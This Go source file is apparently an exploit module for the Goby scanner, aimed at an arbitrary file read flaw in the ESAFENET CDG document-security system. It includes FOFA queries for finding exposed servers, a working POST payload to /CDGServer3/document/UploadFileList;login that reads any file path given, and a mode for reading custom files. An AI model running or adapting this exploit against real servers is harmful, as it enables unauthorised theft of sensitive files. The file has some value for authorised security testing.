package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ESAFENET-CDG /UploadFileList;login File Read Vulnerability",
    "Description": "<p>The electronic document security management system (hereinafter referred to as CDG) is an electronic document security encryption software, which uses the transparent encryption technology of the driver layer to prevent internal employees from leaking secrets and external personnel from illegally stealing the core important data assets of the enterprise through the encryption protection of electronic documents, and protects the whole life cycle of electronic documents to achieve the data security of electronic documents.  </p><p>Arbitrary file reading vulnerability in the electronic document security management system of Esaitong, through which attackers can obtain sensitive information.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2023-12-28",
    "PostTime": "2024-08-07",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"/CDGServer3/index.jsp\" && title=\"电子文档安全管理系统\"",
    "GobyQuery": "body=\"/CDGServer3/index.jsp\" && title=\"电子文档安全管理系统\"",
    "Level": "1",
    "Impact": "<p>Arbitrary file reading vulnerability in the electronic document security management system of Esaitong, through which attackers can obtain sensitive information.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.esafenet.com/product/277483397\">http://www.esafenet.com/product/277483397</a></p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FUploadFileList%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "win.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "c:/windows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "2H1W"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全管理系统 /UploadFileList;login 文件读取漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，实现电子文档的数据安全。&nbsp;</p><p>亿赛通电子文档安全管理系统任意文件读取漏洞，攻击者可通过此漏洞获取敏感信息。&nbsp;<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.esafenet.com/product/277483397\">http://www.esafenet.com/product/277483397</a><br></p>",
            "Impact": "<p>亿赛通电子文档安全管理系统任意文件读取漏洞，攻击者可通过此漏洞获取敏感信息。&nbsp;<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "ESAFENET-CDG /UploadFileList;login File Read Vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>The electronic document security management system (hereinafter referred to as CDG) is an electronic document security encryption software, which uses the transparent encryption technology of the driver layer to prevent internal employees from leaking secrets and external personnel from illegally stealing the core important data assets of the enterprise through the encryption protection of electronic documents, and protects the whole life cycle of electronic documents to achieve the data security of electronic documents.&nbsp;&nbsp;</p><p>Arbitrary file reading vulnerability in the electronic document security management system of Esaitong, through which attackers can obtain sensitive information.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.esafenet.com/product/277483397\">http://www.esafenet.com/product/277483397</a><br></p>",
            "Impact": "<p>Arbitrary file reading vulnerability in the electronic document security management system of Esaitong, through which attackers can obtain sensitive information.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9924"
}`
	postOrGet_svnuisdvnu3h2nu3hf4b2yfby2 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewPostRequestConfig("/CDGServer3/document/UploadFileList;login")
		requestConfig.VerifyTls = false
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		requestConfig.FollowRedirect = false
		requestConfig.Data = "command=VeiwUploadFile&filePath=" + fileUrl + "&fileName1=hello"
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/CDGServer3/document/UploadFileList;login"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"c:/windows/win.ini": "[mci extensions]",
			}
			// 函数继承
			uploadFileFunc := postOrGet_svnuisdvnu3h2nu3hf4b2yfby2

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"win.ini": {"c:/windows/win.ini", "[mci extensions]"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_svnuisdvnu3h2nu3hf4b2yfby2
			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}
			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
